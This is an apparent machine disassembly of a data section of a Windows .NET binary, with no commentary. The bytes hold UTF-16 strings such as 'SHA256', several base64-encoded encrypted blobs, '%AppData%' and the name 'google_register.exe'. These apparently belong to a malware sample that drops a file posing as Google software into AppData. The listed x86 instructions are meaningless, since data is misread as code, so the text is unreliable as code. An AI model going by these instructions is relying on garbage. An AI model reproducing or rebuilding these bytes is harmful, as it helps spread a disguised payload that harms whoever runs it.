  409efc:	00 4c 6a 46          	add    %cl,0x46(%edx,%ebp,2)
  409f00:	7a 47                	jp     0x409f49
  409f02:	61                   	popa
  409f03:	75 77                	jne    0x409f7c
  409f05:	47                   	inc    %edi
  409f06:	7a 79                	jp     0x409f81
  409f08:	00 57 69             	add    %dl,0x69(%edi)
  409f0b:	6d                   	insl   (%dx),%es:(%edi)
  409f0c:	4f                   	dec    %edi
  409f0d:	41                   	inc    %ecx
  409f0e:	4d                   	dec    %ebp
  409f0f:	6b 6c 79 46 7a       	imul   $0x7a,0x46(%ecx,%edi,2),%ebp
  409f14:	00 59 47             	add    %bl,0x47(%ecx)
  409f17:	75 7a                	jne    0x409f93
  409f19:	42                   	inc    %edx
  409f1a:	71 58                	jno    0x409f74
  409f1c:	7a 48                	jp     0x409f66
  409f1e:	64 7a 00             	fs jp  0x409f21
  409f21:	46                   	inc    %esi
  409f22:	4e                   	dec    %esi
  409f23:	4a                   	dec    %edx
  409f24:	41                   	inc    %ecx
  409f25:	43                   	inc    %ebx
  409f26:	4e                   	dec    %esi
  409f27:	6c                   	insb   (%dx),%es:(%edi)
  409f28:	78 50                	js     0x409f7a
  409f2a:	74 7a                	je     0x409fa6
  409f2c:	00 6a 70             	add    %ch,0x70(%edx)
  409f2f:	76 46                	jbe    0x409f77
  409f31:	75 6e                	jne    0x409fa1
  409f33:	58                   	pop    %eax
  409f34:	66 4d                	dec    %bp
  409f36:	45                   	inc    %ebp
  409f37:	4e                   	dec    %esi
  409f38:	79 78                	jns    0x409fb2
  409f3a:	75 7a                	jne    0x409fb6
  409f3c:	00 00                	add    %al,(%eax)
  409f3e:	00 00                	add    %al,(%eax)
  409f40:	00 0d 53 00 48 00    	add    %cl,0x480053
  409f46:	41                   	inc    %ecx
  409f47:	00 32                	add    %dh,(%edx)
  409f49:	00 35 00 36 00 00    	add    %dh,0x3600
  409f4f:	81 59 65 00 6d 00 6d 	sbbl   $0x6d006d00,0x65(%ecx)
  409f56:	00 68 00             	add    %ch,0x0(%eax)
  409f59:	4a                   	dec    %edx
  409f5a:	00 61 00             	add    %ah,0x0(%ecx)
  409f5d:	51                   	push   %ecx
  409f5e:	00 4d 00             	add    %cl,0x0(%ebp)
  409f61:	74 00                	je     0x409f63
  409f63:	55                   	push   %ebp
  409f64:	00 45 00             	add    %al,0x0(%ebp)
  409f67:	79 00                	jns    0x409f69
  409f69:	4c                   	dec    %esp
  409f6a:	00 47 00             	add    %al,0x0(%edi)
  409f6d:	50                   	push   %eax
  409f6e:	00 73 00             	add    %dh,0x0(%ebx)
  409f71:	39 00                	cmp    %eax,(%eax)
  409f73:	73 00                	jae    0x409f75
  409f75:	4d                   	dec    %ebp
  409f76:	00 42 00             	add    %al,0x0(%edx)
  409f79:	5a                   	pop    %edx
  409f7a:	00 41 00             	add    %al,0x0(%ecx)
  409f7d:	56                   	push   %esi
  409f7e:	00 71 00             	add    %dh,0x0(%ecx)
  409f81:	4d                   	dec    %ebp
  409f82:	00 35 00 36 00 73    	add    %dh,0x73003600
  409f88:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  409f8c:	00 49 00             	add    %cl,0x0(%ecx)
  409f8f:	69 00 6a 00 72 00    	imul   $0x72006a,(%eax),%eax
  409f95:	52                   	push   %edx
  409f96:	00 64 00 41          	add    %ah,0x41(%eax,%eax,1)
  409f9a:	00 56 00             	add    %dl,0x0(%esi)
  409f9d:	54                   	push   %esp
  409f9e:	00 65 00             	add    %ah,0x0(%ebp)
  409fa1:	30 00                	xor    %al,(%eax)
  409fa3:	35 00 61 00 46       	xor    $0x46006100,%eax
  409fa8:	00 59 00             	add    %bl,0x0(%ecx)
  409fab:	42                   	inc    %edx
  409fac:	00 70 00             	add    %dh,0x0(%eax)
  409faf:	77 00                	ja     0x409fb1
  409fb1:	32 00                	xor    (%eax),%al
  409fb3:	30 00                	xor    %al,(%eax)
  409fb5:	49                   	dec    %ecx
  409fb6:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  409fba:	00 30                	add    %dh,(%eax)
  409fbc:	00 7a 00             	add    %bh,0x0(%edx)
  409fbf:	62 00                	bound  %eax,(%eax)
  409fc1:	4b                   	dec    %ebx
  409fc2:	00 78 00             	add    %bh,0x0(%eax)
  409fc5:	4d                   	dec    %ebp
  409fc6:	00 32                	add    %dh,(%edx)
  409fc8:	00 6e 00             	add    %ch,0x0(%esi)
  409fcb:	6f                   	outsl  %ds:(%esi),(%dx)
  409fcc:	00 56 00             	add    %dl,0x0(%esi)
  409fcf:	65 00 2b             	add    %ch,%gs:(%ebx)
  409fd2:	00 6f 00             	add    %ch,0x0(%edi)
  409fd5:	6b 00 44             	imul   $0x44,(%eax),%eax
  409fd8:	00 6a 00             	add    %ch,0x0(%edx)
  409fdb:	32 00                	xor    (%eax),%al
  409fdd:	49                   	dec    %ecx
  409fde:	00 53 00             	add    %dl,0x0(%ebx)
  409fe1:	35 00 49 00 77       	xor    $0x77004900,%eax
  409fe6:	00 51 00             	add    %dl,0x0(%ecx)
  409fe9:	50                   	push   %eax
  409fea:	00 61 00             	add    %ah,0x0(%ecx)
  409fed:	53                   	push   %ebx
  409fee:	00 4e 00             	add    %cl,0x0(%esi)
  409ff1:	53                   	push   %ebx
  409ff2:	00 2b                	add    %ch,(%ebx)
  409ff4:	00 43 00             	add    %al,0x0(%ebx)
  409ff7:	4a                   	dec    %edx
  409ff8:	00 58 00             	add    %bl,0x0(%eax)
  409ffb:	77 00                	ja     0x409ffd
  409ffd:	46                   	inc    %esi
  409ffe:	00 41 00             	add    %al,0x0(%ecx)
  40a001:	6f                   	outsl  %ds:(%esi),(%dx)
  40a002:	00 64 00 34          	add    %ah,0x34(%eax,%eax,1)
  40a006:	00 6a 00             	add    %ch,0x0(%edx)
  40a009:	6a 00                	push   $0x0
  40a00b:	42                   	inc    %edx
  40a00c:	00 57 00             	add    %dl,0x0(%edi)
  40a00f:	62 00                	bound  %eax,(%eax)
  40a011:	34 00                	xor    $0x0,%al
  40a013:	4f                   	dec    %edi
  40a014:	00 73 00             	add    %dh,0x0(%ebx)
  40a017:	33 00                	xor    (%eax),%eax
  40a019:	35 00 4f 00 74       	xor    $0x74004f00,%eax
  40a01e:	00 65 00             	add    %ah,0x0(%ebp)
  40a021:	45                   	inc    %ebp
  40a022:	00 33                	add    %dh,(%ebx)
  40a024:	00 50 00             	add    %dl,0x0(%eax)
  40a027:	33 00                	xor    (%eax),%eax
  40a029:	45                   	inc    %ebp
  40a02a:	00 72 00             	add    %dh,0x0(%edx)
  40a02d:	49                   	dec    %ecx
  40a02e:	00 69 00             	add    %ch,0x0(%ecx)
  40a031:	6c                   	insb   (%dx),%es:(%edi)
  40a032:	00 48 00             	add    %cl,0x0(%eax)
  40a035:	67 00 64 00          	add    %ah,0x0(%si)
  40a039:	57                   	push   %edi
  40a03a:	00 71 00             	add    %dh,0x0(%ecx)
  40a03d:	51                   	push   %ecx
  40a03e:	00 69 00             	add    %ch,0x0(%ecx)
  40a041:	6c                   	insb   (%dx),%es:(%edi)
  40a042:	00 39                	add    %bh,(%ecx)
  40a044:	00 79 00             	add    %bh,0x0(%ecx)
  40a047:	46                   	inc    %esi
  40a048:	00 66 00             	add    %ah,0x0(%esi)
  40a04b:	4f                   	dec    %edi
  40a04c:	00 7a 00             	add    %bh,0x0(%edx)
  40a04f:	4b                   	dec    %ebx
  40a050:	00 58 00             	add    %bl,0x0(%eax)
  40a053:	43                   	inc    %ebx
  40a054:	00 39                	add    %bh,(%ecx)
  40a056:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a059:	2f                   	das
  40a05a:	00 31                	add    %dh,(%ecx)
  40a05c:	00 6e 00             	add    %ch,0x0(%esi)
  40a05f:	72 00                	jb     0x40a061
  40a061:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  40a065:	6c                   	insb   (%dx),%es:(%edi)
  40a066:	00 47 00             	add    %al,0x0(%edi)
  40a069:	6d                   	insl   (%dx),%es:(%edi)
  40a06a:	00 71 00             	add    %dh,0x0(%ecx)
  40a06d:	53                   	push   %ebx
  40a06e:	00 41 00             	add    %al,0x0(%ecx)
  40a071:	31 00                	xor    %eax,(%eax)
  40a073:	4c                   	dec    %esp
  40a074:	00 69 00             	add    %ch,0x0(%ecx)
  40a077:	34 00                	xor    $0x0,%al
  40a079:	72 00                	jb     0x40a07b
  40a07b:	34 00                	xor    $0x0,%al
  40a07d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a07e:	00 77 00             	add    %dh,0x0(%edi)
  40a081:	7a 00                	jp     0x40a083
  40a083:	52                   	push   %edx
  40a084:	00 41 00             	add    %al,0x0(%ecx)
  40a087:	34 00                	xor    $0x0,%al
  40a089:	6a 00                	push   $0x0
  40a08b:	78 00                	js     0x40a08d
  40a08d:	72 00                	jb     0x40a08f
  40a08f:	68 00 78 00 4b       	push   $0x4b007800
  40a094:	00 58 00             	add    %bl,0x0(%eax)
  40a097:	67 00 35             	add    %dh,(%di)
  40a09a:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  40a09e:	00 76 00             	add    %dh,0x0(%esi)
  40a0a1:	46                   	inc    %esi
  40a0a2:	00 65 00             	add    %ah,0x0(%ebp)
  40a0a5:	59                   	pop    %ecx
  40a0a6:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40a0ac:	4d                   	dec    %ebp
  40a0ad:	00 4d 00             	add    %cl,0x0(%ebp)
  40a0b0:	2f                   	das
  40a0b1:	00 75 00             	add    %dh,0x0(%ebp)
  40a0b4:	59                   	pop    %ecx
  40a0b5:	00 57 00             	add    %dl,0x0(%edi)
  40a0b8:	4e                   	dec    %esi
  40a0b9:	00 65 00             	add    %ah,0x0(%ebp)
  40a0bc:	4e                   	dec    %esi
  40a0bd:	00 53 00             	add    %dl,0x0(%ebx)
  40a0c0:	70 00                	jo     0x40a0c2
  40a0c2:	65 00 4f 00          	add    %cl,%gs:0x0(%edi)
  40a0c6:	56                   	push   %esi
  40a0c7:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
  40a0cb:	00 74 00 57          	add    %dh,0x57(%eax,%eax,1)
  40a0cf:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a0d2:	6b 00 54             	imul   $0x54,(%eax),%eax
  40a0d5:	00 58 00             	add    %bl,0x0(%eax)
  40a0d8:	6d                   	insl   (%dx),%es:(%edi)
  40a0d9:	00 5a 00             	add    %bl,0x0(%edx)
  40a0dc:	45                   	inc    %ebp
  40a0dd:	00 6e 00             	add    %ch,0x0(%esi)
  40a0e0:	68 00 64 00 50       	push   $0x50006400
  40a0e5:	00 56 00             	add    %dl,0x0(%esi)
  40a0e8:	67 00 39             	add    %bh,(%bx,%di)
  40a0eb:	00 50 00             	add    %dl,0x0(%eax)
  40a0ee:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40a0f2:	6b 00 57             	imul   $0x57,(%eax),%eax
  40a0f5:	00 63 00             	add    %ah,0x0(%ebx)
  40a0f8:	32 00                	xor    (%eax),%al
  40a0fa:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0fb:	00 4e 00             	add    %cl,0x0(%esi)
  40a0fe:	73 00                	jae    0x40a100
  40a100:	52                   	push   %edx
  40a101:	00 2b                	add    %ch,(%ebx)
  40a103:	00 4f 00             	add    %cl,0x0(%edi)
  40a106:	32 00                	xor    (%eax),%al
  40a108:	6c                   	insb   (%dx),%es:(%edi)
  40a109:	00 53 00             	add    %dl,0x0(%ebx)
  40a10c:	63 00                	arpl   %eax,(%eax)
  40a10e:	6c                   	insb   (%dx),%es:(%edi)
  40a10f:	00 31                	add    %dh,(%ecx)
  40a111:	00 30                	add    %dh,(%eax)
  40a113:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40a117:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40a11b:	00 45 00             	add    %al,0x0(%ebp)
  40a11e:	4f                   	dec    %edi
  40a11f:	00 4a 00             	add    %cl,0x0(%edx)
  40a122:	44                   	inc    %esp
  40a123:	00 2f                	add    %ch,(%edi)
  40a125:	00 70 00             	add    %dh,0x0(%eax)
  40a128:	46                   	inc    %esi
  40a129:	00 69 00             	add    %ch,0x0(%ecx)
  40a12c:	67 00 55 00          	add    %dl,0x0(%di)
  40a130:	2b 00                	sub    (%eax),%eax
  40a132:	59                   	pop    %ecx
  40a133:	00 72 00             	add    %dh,0x0(%edx)
  40a136:	58                   	pop    %eax
  40a137:	00 6e 00             	add    %ch,0x0(%esi)
  40a13a:	7a 00                	jp     0x40a13c
  40a13c:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40a140:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  40a144:	51                   	push   %ecx
  40a145:	00 43 00             	add    %al,0x0(%ebx)
  40a148:	57                   	push   %edi
  40a149:	00 4b 00             	add    %cl,0x0(%ebx)
  40a14c:	46                   	inc    %esi
  40a14d:	00 35 00 35 00 48    	add    %dh,0x48003500
  40a153:	00 6b 00             	add    %ch,0x0(%ebx)
  40a156:	41                   	inc    %ecx
  40a157:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40a15d:	80 b1 30 00 30 00 4f 	xorb   $0x4f,0x300030(%ecx)
  40a164:	00 6e 00             	add    %ch,0x0(%esi)
  40a167:	4c                   	dec    %esp
  40a168:	00 57 00             	add    %dl,0x0(%edi)
  40a16b:	56                   	push   %esi
  40a16c:	00 46 00             	add    %al,0x0(%esi)
  40a16f:	34 00                	xor    $0x0,%al
  40a171:	4e                   	dec    %esi
  40a172:	00 43 00             	add    %al,0x0(%ebx)
  40a175:	6f                   	outsl  %ds:(%esi),(%dx)
  40a176:	00 2b                	add    %ch,(%ebx)
  40a178:	00 33                	add    %dh,(%ebx)
  40a17a:	00 47 00             	add    %al,0x0(%edi)
  40a17d:	4b                   	dec    %ebx
  40a17e:	00 4f 00             	add    %cl,0x0(%edi)
  40a181:	77 00                	ja     0x40a183
  40a183:	54                   	push   %esp
  40a184:	00 42 00             	add    %al,0x0(%edx)
  40a187:	58                   	pop    %eax
  40a188:	00 4a 00             	add    %cl,0x0(%edx)
  40a18b:	73 00                	jae    0x40a18d
  40a18d:	4c                   	dec    %esp
  40a18e:	00 6e 00             	add    %ch,0x0(%esi)
  40a191:	38 00                	cmp    %al,(%eax)
  40a193:	4b                   	dec    %ebx
  40a194:	00 77 00             	add    %dh,0x0(%edi)
  40a197:	44                   	inc    %esp
  40a198:	00 48 00             	add    %cl,0x0(%eax)
  40a19b:	4f                   	dec    %edi
  40a19c:	00 45 00             	add    %al,0x0(%ebp)
  40a19f:	4b                   	dec    %ebx
  40a1a0:	00 55 00             	add    %dl,0x0(%ebp)
  40a1a3:	41                   	inc    %ecx
  40a1a4:	00 57 00             	add    %dl,0x0(%edi)
  40a1a7:	57                   	push   %edi
  40a1a8:	00 43 00             	add    %al,0x0(%ebx)
  40a1ab:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40a1af:	55                   	push   %ebp
  40a1b0:	00 48 00             	add    %cl,0x0(%eax)
  40a1b3:	33 00                	xor    (%eax),%eax
  40a1b5:	6a 00                	push   $0x0
  40a1b7:	4c                   	dec    %esp
  40a1b8:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  40a1bc:	00 67 00             	add    %ah,0x0(%edi)
  40a1bf:	72 00                	jb     0x40a1c1
  40a1c1:	62 00                	bound  %eax,(%eax)
  40a1c3:	2b 00                	sub    (%eax),%eax
  40a1c5:	50                   	push   %eax
  40a1c6:	00 72 00             	add    %dh,0x0(%edx)
  40a1c9:	50                   	push   %eax
  40a1ca:	00 67 00             	add    %ah,0x0(%edi)
  40a1cd:	33 00                	xor    (%eax),%eax
  40a1cf:	47                   	inc    %edi
  40a1d0:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  40a1d4:	00 33                	add    %dh,(%ebx)
  40a1d6:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  40a1da:	00 6b 00             	add    %ch,0x0(%ebx)
  40a1dd:	6c                   	insb   (%dx),%es:(%edi)
  40a1de:	00 5a 00             	add    %bl,0x0(%edx)
  40a1e1:	41                   	inc    %ecx
  40a1e2:	00 48 00             	add    %cl,0x0(%eax)
  40a1e5:	33 00                	xor    (%eax),%eax
  40a1e7:	50                   	push   %eax
  40a1e8:	00 5a 00             	add    %bl,0x0(%edx)
  40a1eb:	7a 00                	jp     0x40a1ed
  40a1ed:	4f                   	dec    %edi
  40a1ee:	00 77 00             	add    %dh,0x0(%edi)
  40a1f1:	56                   	push   %esi
  40a1f2:	00 61 00             	add    %ah,0x0(%ecx)
  40a1f5:	68 00 54 00 66       	push   $0x66005400
  40a1fa:	00 43 00             	add    %al,0x0(%ebx)
  40a1fd:	6a 00                	push   $0x0
  40a1ff:	61                   	popa
  40a200:	00 59 00             	add    %bl,0x0(%ecx)
  40a203:	63 00                	arpl   %eax,(%eax)
  40a205:	5a                   	pop    %edx
  40a206:	00 70 00             	add    %dh,0x0(%eax)
  40a209:	41                   	inc    %ecx
  40a20a:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40a210:	80 b1 34 00 41 00 4f 	xorb   $0x4f,0x410034(%ecx)
  40a217:	00 6d 00             	add    %ch,0x0(%ebp)
  40a21a:	43                   	inc    %ebx
  40a21b:	00 4a 00             	add    %cl,0x0(%edx)
  40a21e:	5a                   	pop    %edx
  40a21f:	00 45 00             	add    %al,0x0(%ebp)
  40a222:	52                   	push   %edx
  40a223:	00 45 00             	add    %al,0x0(%ebp)
  40a226:	68 00 49 00 38       	push   $0x38004900
  40a22b:	00 51 00             	add    %dl,0x0(%ecx)
  40a22e:	57                   	push   %edi
  40a22f:	00 51 00             	add    %dl,0x0(%ecx)
  40a232:	37                   	aaa
  40a233:	00 4d 00             	add    %cl,0x0(%ebp)
  40a236:	6d                   	insl   (%dx),%es:(%edi)
  40a237:	00 59 00             	add    %bl,0x0(%ecx)
  40a23a:	72 00                	jb     0x40a23c
  40a23c:	61                   	popa
  40a23d:	00 55 00             	add    %dl,0x0(%ebp)
  40a240:	66 00 6e 00          	data16 add %ch,0x0(%esi)
  40a244:	77 00                	ja     0x40a246
  40a246:	53                   	push   %ebx
  40a247:	00 67 00             	add    %ah,0x0(%edi)
  40a24a:	47                   	inc    %edi
  40a24b:	00 6d 00             	add    %ch,0x0(%ebp)
  40a24e:	4d                   	dec    %ebp
  40a24f:	00 4b 00             	add    %cl,0x0(%ebx)
  40a252:	32 00                	xor    (%eax),%al
  40a254:	4d                   	dec    %ebp
  40a255:	00 78 00             	add    %bh,0x0(%eax)
  40a258:	65 00 5a 00          	add    %bl,%gs:0x0(%edx)
  40a25c:	38 00                	cmp    %al,(%eax)
  40a25e:	34 00                	xor    $0x0,%al
  40a260:	7a 00                	jp     0x40a262
  40a262:	6c                   	insb   (%dx),%es:(%edi)
  40a263:	00 6f 00             	add    %ch,0x0(%edi)
  40a266:	2b 00                	sub    (%eax),%eax
  40a268:	79 00                	jns    0x40a26a
  40a26a:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  40a26e:	38 00                	cmp    %al,(%eax)
  40a270:	36 00 69 00          	add    %ch,%ss:0x0(%ecx)
  40a274:	63 00                	arpl   %eax,(%eax)
  40a276:	6f                   	outsl  %ds:(%esi),(%dx)
  40a277:	00 63 00             	add    %ah,0x0(%ebx)
  40a27a:	35 00 6d 00 4f       	xor    $0x4f006d00,%eax
  40a27f:	00 65 00             	add    %ah,0x0(%ebp)
  40a282:	58                   	pop    %eax
  40a283:	00 55 00             	add    %dl,0x0(%ebp)
  40a286:	43                   	inc    %ebx
  40a287:	00 4c 00 68          	add    %cl,0x68(%eax,%eax,1)
  40a28b:	00 72 00             	add    %dh,0x0(%edx)
  40a28e:	4f                   	dec    %edi
  40a28f:	00 31                	add    %dh,(%ecx)
  40a291:	00 45 00             	add    %al,0x0(%ebp)
  40a294:	38 00                	cmp    %al,(%eax)
  40a296:	6f                   	outsl  %ds:(%esi),(%dx)
  40a297:	00 77 00             	add    %dh,0x0(%edi)
  40a29a:	4f                   	dec    %edi
  40a29b:	00 45 00             	add    %al,0x0(%ebp)
  40a29e:	75 00                	jne    0x40a2a0
  40a2a0:	4a                   	dec    %edx
  40a2a1:	00 44 00 34          	add    %al,0x34(%eax,%eax,1)
  40a2a5:	00 57 00             	add    %dl,0x0(%edi)
  40a2a8:	51                   	push   %ecx
  40a2a9:	00 4e 00             	add    %cl,0x0(%esi)
  40a2ac:	4d                   	dec    %ebp
  40a2ad:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40a2b1:	00 72 00             	add    %dh,0x0(%edx)
  40a2b4:	77 00                	ja     0x40a2b6
  40a2b6:	4f                   	dec    %edi
  40a2b7:	00 2f                	add    %ch,(%edi)
  40a2b9:	00 6f 00             	add    %ch,0x0(%edi)
  40a2bc:	67 00 3d             	add    %bh,(%di)
  40a2bf:	00 3d 00 00 13 25    	add    %bh,0x25130000
  40a2c5:	00 41 00             	add    %al,0x0(%ecx)
  40a2c8:	70 00                	jo     0x40a2ca
  40a2ca:	70 00                	jo     0x40a2cc
  40a2cc:	44                   	inc    %esp
  40a2cd:	00 61 00             	add    %ah,0x0(%ecx)
  40a2d0:	74 00                	je     0x40a2d2
  40a2d2:	61                   	popa
  40a2d3:	00 25 00 00 27 67    	add    %ah,0x67270000
  40a2d9:	00 6f 00             	add    %ch,0x0(%edi)
  40a2dc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2dd:	00 67 00             	add    %ah,0x0(%edi)
  40a2e0:	6c                   	insb   (%dx),%es:(%edi)
  40a2e1:	00 65 00             	add    %ah,0x0(%ebp)
  40a2e4:	5f                   	pop    %edi
  40a2e5:	00 72 00             	add    %dh,0x0(%edx)
  40a2e8:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a2ec:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  40a2f2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a2f6:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40a2fa:	78 00                	js     0x40a2fc
  40a2fc:	65 00 00             	add    %al,%gs:(%eax)
  40a2ff:	59                   	pop    %ecx
  40a300:	54                   	push   %esp
  40a301:	00 47 00             	add    %al,0x0(%edi)
  40a304:	34 00                	xor    $0x0,%al
  40a306:	35 00 4e 00 6e       	xor    $0x6e004e00,%eax
  40a30b:	00 70 00             	add    %dh,0x0(%eax)
  40a30e:	50                   	push   %eax
  40a30f:	00 57 00             	add    %dl,0x0(%edi)
  40a312:	47                   	inc    %edi
  40a313:	00 56 00             	add    %dl,0x0(%esi)
  40a316:	76 00                	jbe    0x40a318
  40a318:	4d                   	dec    %ebp
  40a319:	00 45 00             	add    %al,0x0(%ebp)
  40a31c:	4d                   	dec    %ebp
  40a31d:	00 33                	add    %dh,(%ebx)
  40a31f:	00 62 00             	add    %ah,0x0(%edx)
  40a322:	54                   	push   %esp
  40a323:	00 59 00             	add    %bl,0x0(%ecx)
  40a326:	31 00                	xor    %eax,(%eax)
  40a328:	4e                   	dec    %esi
  40a329:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  40a32d:	00 78 00             	add    %bh,0x0(%eax)
  40a330:	56                   	push   %esi
  40a331:	00 32                	add    %dh,(%edx)
  40a333:	00 70 00             	add    %dh,0x0(%eax)
  40a336:	34 00                	xor    $0x0,%al
  40a338:	54                   	push   %esp
  40a339:	00 46 00             	add    %al,0x0(%esi)
  40a33c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a33d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a340:	53                   	push   %ebx
  40a341:	00 32                	add    %dh,(%edx)
  40a343:	00 31                	add    %dh,(%ecx)
  40a345:	00 61 00             	add    %ah,0x0(%ecx)
  40a348:	62 00                	bound  %eax,(%eax)
  40a34a:	48                   	dec    %eax
  40a34b:	00 70 00             	add    %dh,0x0(%eax)
  40a34e:	4c                   	dec    %esp
  40a34f:	00 4f 00             	add    %cl,0x0(%edi)
  40a352:	57                   	push   %edi
  40a353:	00 30                	add    %dh,(%eax)
  40a355:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40a35b:	46                   	inc    %esi
  40a35c:	00 6d 00             	add    %ch,0x0(%ebp)
  40a35f:	6d                   	insl   (%dx),%es:(%edi)
  40a360:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
  40a364:	00 5a 00             	add    %bl,0x0(%edx)
  40a367:	74 00                	je     0x40a369
  40a369:	6a 00                	push   $0x0
  40a36b:	39 00                	cmp    %eax,(%eax)
  40a36d:	34 00                	xor    $0x0,%al
  40a36f:	33 00                	xor    (%eax),%eax
  40a371:	49                   	dec    %ecx
  40a372:	00 2f                	add    %ch,(%edi)
  40a374:	00 57 00             	add    %dl,0x0(%edi)
  40a377:	41                   	inc    %ecx
  40a378:	00 45 00             	add    %al,0x0(%ebp)
  40a37b:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  40a37f:	4b                   	dec    %ebx
  40a380:	00 71 00             	add    %dh,0x0(%ecx)
  40a383:	6a 00                	push   $0x0
  40a385:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40a38b:	55                   	push   %ebp
  40a38c:	00 72 00             	add    %dh,0x0(%edx)
  40a38f:	61                   	popa
  40a390:	00 7a 00             	add    %bh,0x0(%edx)
  40a393:	32 00                	xor    (%eax),%al
  40a395:	68 00 41 00 7a       	push   $0x7a004100
  40a39a:	00 6b 00             	add    %ch,0x0(%ebx)
  40a39d:	48                   	dec    %eax
  40a39e:	00 45 00             	add    %al,0x0(%ebp)
  40a3a1:	31 00                	xor    %eax,(%eax)
  40a3a3:	43                   	inc    %ebx
  40a3a4:	00 5a 00             	add    %bl,0x0(%edx)
  40a3a7:	63 00                	arpl   %eax,(%eax)
  40a3a9:	53                   	push   %ebx
  40a3aa:	00 70 00             	add    %dh,0x0(%eax)
  40a3ad:	79 00                	jns    0x40a3af
  40a3af:	77 00                	ja     0x40a3b1
  40a3b1:	37                   	aaa
  40a3b2:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a3b5:	54                   	push   %esp
  40a3b6:	00 4c 00 2f          	add    %cl,0x2f(%eax,%eax,1)
  40a3ba:	00 4f 00             	add    %cl,0x0(%edi)
  40a3bd:	57                   	push   %edi
  40a3be:	00 58 00             	add    %bl,0x0(%eax)
  40a3c1:	50                   	push   %eax
  40a3c2:	00 6e 00             	add    %ch,0x0(%esi)
  40a3c5:	4d                   	dec    %ebp
  40a3c6:	00 70 00             	add    %dh,0x0(%eax)
  40a3c9:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
  40a3cd:	30 00                	xor    %al,(%eax)
  40a3cf:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a3d3:	71 00                	jno    0x40a3d5
  40a3d5:	62 00                	bound  %eax,(%eax)
  40a3d7:	61                   	popa
  40a3d8:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  40a3dc:	00 43 00             	add    %al,0x0(%ebx)
  40a3df:	5a                   	pop    %edx
  40a3e0:	00 43 00             	add    %al,0x0(%ebx)
  40a3e3:	33 00                	xor    (%eax),%eax
  40a3e5:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40a3e9:	79 00                	jns    0x40a3eb
  40a3eb:	41                   	inc    %ecx
  40a3ec:	00 67 00             	add    %ah,0x0(%edi)
  40a3ef:	4c                   	dec    %esp
  40a3f0:	00 2f                	add    %ch,(%edi)
  40a3f2:	00 52 00             	add    %dl,0x0(%edx)
  40a3f5:	58                   	pop    %eax
  40a3f6:	00 68 00             	add    %ch,0x0(%eax)
  40a3f9:	6b 00 65             	imul   $0x65,(%eax),%eax
  40a3fc:	00 69 00             	add    %ch,0x0(%ecx)
  40a3ff:	2f                   	das
  40a400:	00 6e 00             	add    %ch,0x0(%esi)
  40a403:	41                   	inc    %ecx
  40a404:	00 51 00             	add    %dl,0x0(%ecx)
  40a407:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a40c:	92                   	xchg   %eax,%edx
  40a40d:	59                   	pop    %ecx
  40a40e:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40a412:	30 00                	xor    %al,(%eax)
  40a414:	43                   	inc    %ebx
  40a415:	00 51 00             	add    %dl,0x0(%ecx)
  40a418:	6e                   	outsb  %ds:(%esi),(%dx)
  40a419:	00 73 00             	add    %dh,0x0(%ebx)
  40a41c:	73 00                	jae    0x40a41e
  40a41e:	64 00 68 00          	add    %ch,%fs:0x0(%eax)
  40a422:	50                   	push   %eax
  40a423:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  40a427:	00 48 00             	add    %cl,0x0(%eax)
  40a42a:	5a                   	pop    %edx
  40a42b:	00 4e 00             	add    %cl,0x0(%esi)
  40a42e:	2f                   	das
  40a42f:	00 65 00             	add    %ah,0x0(%ebp)
  40a432:	38 00                	cmp    %al,(%eax)
  40a434:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40a438:	48                   	dec    %eax
  40a439:	00 35 00 68 00 50    	add    %dh,0x50006800
  40a43f:	00 73 00             	add    %dh,0x0(%ebx)
  40a442:	67 00 34             	add    %dh,(%si)
  40a445:	00 4d 00             	add    %cl,0x0(%ebp)
  40a448:	6a 00                	push   $0x0
  40a44a:	39 00                	cmp    %eax,(%eax)
  40a44c:	72 00                	jb     0x40a44e
  40a44e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a44f:	00 47 00             	add    %al,0x0(%edi)
  40a452:	63 00                	arpl   %eax,(%eax)
  40a454:	38 00                	cmp    %al,(%eax)
  40a456:	44                   	inc    %esp
  40a457:	00 70 00             	add    %dh,0x0(%eax)
